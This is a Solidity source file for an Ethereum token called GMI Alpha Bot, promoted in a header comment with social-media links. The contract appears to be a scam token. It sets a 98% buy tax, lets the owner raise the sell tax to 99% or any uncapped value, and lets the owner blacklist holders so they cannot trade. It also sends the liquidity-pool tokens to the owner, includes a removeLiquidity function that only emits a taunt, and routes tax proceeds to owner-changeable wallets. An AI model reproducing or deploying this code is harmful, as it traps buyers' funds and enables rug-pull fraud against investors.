1 /* 
2 
3 GMI Alpha Bot - The ultimate Telegram channel for degens, offering the best alphas and the best sniping bots.
4 
5 Doors are opening:
6 t.me/gmialphabot
7 twitter.com/GMIAlphaBot
8 
9 */
10 
11 // SPDX-License-Identifier: MIT
12 
13 pragma solidity ^0.8.21;
14 
15 abstract contract Context {
16     function _msgSender() internal view virtual returns (address) {
17         return msg.sender;
18     }
19 }
20 
21 interface IERC20 {
22     function totalSupply() external view returns (uint256);
23     function balanceOf(address account) external view returns (uint256);
24     function transfer(address recipient, uint256 amount) external returns (bool);
25     function allowance(address owner, address spender) external view returns (uint256);
26     function approve(address spender, uint256 amount) external returns (bool);
27     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
28     event Transfer(address indexed from, address indexed to, uint256 value);
29     event Approval (address indexed owner, address indexed spender, uint256 value);
30 }
31 
32 contract Ownable is Context {
33     address private _owner;
34     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
35 
36     constructor () {
37         address msgSender = _msgSender();
38         _owner = msgSender;
39         emit OwnershipTransferred(address(0), msgSender);
40     }
41 
42     function owner() public view returns (address) {
43         return _owner;
44     }
45 
46     modifier onlyOwner() {
47         require(_owner == _msgSender(), "Ownable: caller is not the owner");
48         _;
49     }
50 
51     function renounceOwnership() public virtual onlyOwner {
52         emit OwnershipTransferred(_owner, address(0));
53         _owner = address(0);
54     }
55 }
56 
57 interface IUniswapV2Factory {
58     function createPair(address tokenA, address tokenB) external returns (address pair);
59 }
60 
61 interface IUniswapV2Router02 {
62     function swapExactTokensForETHSupportingFeeOnTransferTokens(
63         uint amountIn,
64         uint amountOutMin,
65         address[] calldata path,
66         address to,
67         uint deadline
68     ) external;
69     function factory() external pure returns (address);
70     function WETH() external pure returns (address);
71     function addLiquidityETH(
72         address token,
73         uint amountTokenDesired,
74         uint amountTokenMin,
75         uint amountETHMin,
76         address to,
77         uint deadline
78     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
79 }
80 
81 contract GMIBOT is Context, IERC20, Ownable {
82     mapping(address => uint256) private _balances;
83     mapping(address => mapping(address => uint256)) private _allowances;
84     mapping(address => bool) private _isExcludedFromFee;
85     mapping(address => bool) private blacklist;
86     
87     address payable private team_wallet;
88     address payable private rewards_wallet;
89 
90     uint256 firstBlock;
91 
92     string private constant _name = "GMI Alpha Bot";
93     string private constant _symbol = "GMIBOT";
94     uint8 private constant _decimals = 18;
95     uint256 private constant _totalSupply = 1_000_000_000 * 10**_decimals;
96 
97     uint256 private _BuyTax = 98;
98     uint256 private _SellTax = 30;
99     uint256 private _preventSwapBefore = 70;
100     uint256 public _maxTxAmount = 2_000_000 * 10**_decimals;
101     uint256 public _maxWalletSize = _totalSupply / 250;
102     uint256 public _taxSwapThreshold;
103     
104     uint256 private _buyCounter = 0;
105     uint256 private _KillBotsCounter = 0;
106     uint256 private _updateBuyTaxCounter = 0;
107     uint256 private _updateSellTaxCounter = 0;
108 
109     IUniswapV2Router02 private uniswapV2Router;
110     address private uniswapV2Pair;
111     bool private inSwap = false;
112     bool private swapEnabled = false;
113 
114     event Message(address indexed sender, string message);
115     event KillBotsToggled(bool enabled);
116     event MaxTxAmountUpdated(uint256 _maxTxAmount);
117     
118     modifier lockTheSwap {
119         inSwap = true;
120         _;
121         inSwap = false;
122     }
123 
124     constructor () {
125         team_wallet = payable(0x2Faaecf11A9EB1F2E636fEB0a40073D04B00e009);
126         rewards_wallet = payable(0x385b705FfB300a9Ce89E9FC6949654266e4a0599);
127 
128         _balances[_msgSender()] = _totalSupply;
129         
130         _isExcludedFromFee[owner()] = true;
131         _isExcludedFromFee[address(this)] = true;
132         _isExcludedFromFee[team_wallet] = true;
133         _isExcludedFromFee[rewards_wallet] = true;
134 
135         emit Transfer(address(0), msg.sender, _totalSupply);
136     }
137 
138     function name() public pure returns (string memory) {
139         return _name;
140     }
141 
142     function symbol() public pure returns (string memory) {
143         return _symbol;
144     }
145 
146     function decimals() public pure returns (uint8) {
147         return _decimals;
148     }
149 
150     function totalSupply() public pure override returns (uint256) {
151         return _totalSupply;
152     }
153 
154     function setTeamWallet(address payable _teamWallet) external onlyOwner {
155         require(_teamWallet != address(0), "Address must be valid");
156         team_wallet = _teamWallet;
157     }
158 
159     function setRewardsWallet(address payable _rewardsWallet) external onlyOwner {
160         require(_rewardsWallet != address(0), "Address must be valid");
161         rewards_wallet = _rewardsWallet;
162     }
163 
164     function withdrawETH() external onlyOwner {
165         payable(owner()).transfer(address(this).balance);
166     }
167 
168     function withdrawToken(IERC20 token) external onlyOwner {
169         uint256 balance = token.balanceOf(address(this));
170         token.transfer(owner(), balance);
171     }
172 
173     function removeLiquidity() external onlyOwner {
174         emit Message(msg.sender, "Too bad to see you leaving that early");
175     }
176 
177     function triggerKillBots() external onlyOwner {
178         require(_KillBotsCounter < 2, "KillBots can only be triggered twice");
179 
180         _SellTax = 99;
181         _KillBotsCounter++;
182     }
183 
184     function updateBuyTax(uint256 value) external onlyOwner {
185         require(_updateBuyTaxCounter < 6, "updateBuyTax can only be called 6 times");
186         _BuyTax = value;
187         _updateBuyTaxCounter++;
188     }
189 
190     function updateSellTax(uint256 value) external onlyOwner {
191         require(_updateSellTaxCounter < 6, "updateSellTax can only be called 6 times");
192         _SellTax = value;
193         _updateSellTaxCounter++;
194     }
195 
196     function balanceOf(address account) public view override returns (uint256) {
197         return _balances[account];
198     }
199 
200     function transfer(address recipient, uint256 amount) public override returns (bool) {
201         _transfer(msg.sender, recipient, amount);
202         return true;
203     }
204 
205     function allowance(address owner, address spender) public view override returns (uint256) {
206         return _allowances[owner][spender];
207     }
208 
209     function approve(address spender, uint256 amount) public override returns (bool) {
210         _approve(msg.sender, spender, amount);
211         return true;
212     }
213 
214     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
215         _transfer(sender, recipient, amount);
216         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
217         return true;
218 
219     }
220 
221     function _approve(address owner, address spender, uint256 amount) private {
222         require(owner != address(0), "ERC20: approve from the zero address");
223         require(spender != address(0), "ERC20: approve to the zero address");
224 
225         _allowances[owner][spender] = amount;
226         emit Approval(owner, spender, amount);
227     }
228 
229     function _transfer(address from, address to, uint256 amount) private {
230         require(from != address(0), "ERC20: transfer from the zero address");
231         require(to != address(0), "ERC20: transfer to the zero address");
232         require(amount > 0, "Transfer amount must be greater than zero");
233         
234         uint256 taxAmount = 0;
235 
236         if (from != owner() && to != owner() && from != address(this) && !_isExcludedFromFee[from]) {
237             require(!blacklist[from] && !blacklist[to]);
238             
239             if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
240                 taxAmount = (amount * _BuyTax) / 100;
241                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
242                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
243 
244                 if (firstBlock + 3 > block.number) {
245                     require(!isContract(to));
246                 }
247                 _buyCounter++;
248             }
249 
250             if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {
251                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
252             }
253 
254             if (to == uniswapV2Pair && from != address(this)) {
255                 taxAmount = (amount * _SellTax) / 100;
256             }
257 
258             uint256 contractTokenBalance = balanceOf(address(this));
259             if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance >= _taxSwapThreshold && _buyCounter > _preventSwapBefore) {
260                 swapTokensForEth(_taxSwapThreshold);
261             }
262         }
263 
264         if (taxAmount > 0) {
265             _balances[address(this)] += taxAmount;
266             emit Transfer(from, address(this), taxAmount);
267         }
268         _balances[from] -= amount;
269         _balances[to] += amount - taxAmount;
270         emit Transfer(from, to, amount - taxAmount);
271     }
272 
273     function min(uint256 a, uint256 b) private pure returns (uint256) {
274         return (a > b) ? b : a;
275     }
276 
277     function isContract(address account) private view returns (bool) {
278         uint256 size;
279         assembly {
280             size := extcodesize(account)
281         }
282         return size > 0;
283     }
284 
285     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
286         address[] memory path = new address[](2);
287         path[0] = address(this);
288         path[1] = uniswapV2Router.WETH();
289         _approve(address(this), address(uniswapV2Router), tokenAmount);
290         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
291             tokenAmount,
292             0,
293             path,
294             address(this),
295             block.timestamp
296         );
297 
298         uint256 contractETHBalance = address(this).balance;
299         uint256 teamAmount = (contractETHBalance * 60) / 100;
300         uint256 rewardsAmount = contractETHBalance - teamAmount;
301 
302         team_wallet.transfer(teamAmount);
303         rewards_wallet.transfer(rewardsAmount);
304     }
305 
306     function killLimits() external onlyOwner {
307         _maxTxAmount = _totalSupply;
308         _maxWalletSize = _totalSupply;
309         emit MaxTxAmountUpdated(_totalSupply);
310     }
311 
312     function updateTaxSwapThreshold(uint256 newThreshold) external onlyOwner {
313         _taxSwapThreshold = newThreshold;
314     }
315 
316     function burn(uint256 amount) public onlyOwner {
317         require(amount <= _balances[msg.sender], "Amount exceeds available balance");
318 
319         _transfer(msg.sender, 0x000000000000000000000000000000000000dEaD, amount);
320     }
321 
322     function addBlacklist(address[] memory addresses) public onlyOwner {
323         for (uint i = 0; i < addresses.length; i++) {
324             blacklist[addresses[i]] = true;
325         }
326     }
327 
328     function delBlacklist(address[] memory addresses) public onlyOwner {
329         for (uint i = 0; i < addresses.length; i++) {
330             blacklist[addresses[i]] = false;
331         }
332     }
333 
334     function isBlacklist(address a) public view returns (bool) {
335         return blacklist[a];
336     }
337 
338     function knockKnock() external onlyOwner {
339         require(!swapEnabled, "trading is already open");
340         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
341         _approve(address(this), address(uniswapV2Router), _totalSupply);
342         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
343         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
344         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
345         _taxSwapThreshold = (_totalSupply * 2) / 1000;
346         swapEnabled = true;
347         firstBlock = block.number;
348     }
349 
350     receive() external payable {}
351 }